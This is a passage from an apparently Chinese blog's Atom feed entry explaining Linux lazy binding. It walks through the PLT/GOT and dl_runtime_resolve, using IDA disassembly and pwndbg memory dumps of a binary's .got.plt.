;dl_runtime_resolve.got.plt:0000000000403650 off_403650      dq offset puts          .got.plt:0000000000403658 off_403658      dq offset setbuf        .got.plt:0000000000403660 off_403660      dq offset system        .got.plt:0000000000403668 off_403668      dq offset printf        .got.plt:0000000000403670 off_403670      dq offset memset       .got.plt:0000000000403678 off_403678      dq offset read         .got.plt:0000000000403680 off_403680      dq offset __isoc99_scanf.got.plt:0000000000403688 off_403688      dq offset exit          .got.plt:0000000000403688 _got_plt        ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>got[0]</code>和<code>got[1]</code>（即<code>qword_403640</code>和<code>qword_403648</code>）分别是<code>linkmap</code>和<code>dl_runtime_resolve</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;2gx 0x4036400x403640:0x00007ffff7ffe1900x00007ffff7fe7bc0pwndbg&gt; x&#x2F;gx 0x00007ffff7fe7bc00x7ffff7fe7bc0 &lt;_dl_runtime_resolve_xsavec&gt;:0xe3894853fa1e0ff3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以函数<code>sub_401020</code>就是将<code>linkmap</code>入栈并跳转到<code>dl_runtime_resolve</code>寻找函数真实地址，找到真实地址之后会更新<code>system_got</code>内容为<code>system</code>函数的真实地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/gx 0x00000000004036600x403660 <span class="token operator">&lt;</span>system@got.plt<span class="token operator">></span>:0x00007fad32b74290<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>后续再次调用<code>system</code>函数时会通过<code>system_plt</code>跳转到<code>system_got</code>直接得到<code>system</code>函数的真实地址</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>plt</code>中是汇编指令，通过<code>jmp got</code>跳转到<code>got</code>表</li><li>第一次调用之前<code>got</code>表存放了<code>plt</code>第二条汇编指令的地址，如果没开<code>pie</code>那么这个地址是已知的</li><li>第一次调用时通过<code>jmp got[1]</code>调用<code>dl_runtime_resolve</code>并以<code>got[0]</code>为基址找到函数真实地址，所以在延迟绑定之前不能覆盖<code>got[0]</code>和<code>got[1]</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学&lt;code&gt;pwn&lt;/code&gt;的时候了解到&lt;code&gt;linux&lt;/code&gt;存在延迟绑定机制，延迟绑定之后&lt;code&gt;plt-&amp;gt;got-&amp;gt;函数真实地址&lt;/code&gt;，这两天比赛遇到问题了才去关注了一下延迟绑定的具体过程&lt;/p&gt;
&lt;h2 id=&quot;概念&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="Linux" scheme="https://starrysky1004.github.io/categories/Linux/"/>
    
    
    <category term="linux" scheme="https://starrysky1004.github.io/tags/linux/"/>
    
    <category term="延迟绑定" scheme="https://starrysky1004.github.io/tags/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
    
  </entry>
  
</feed>
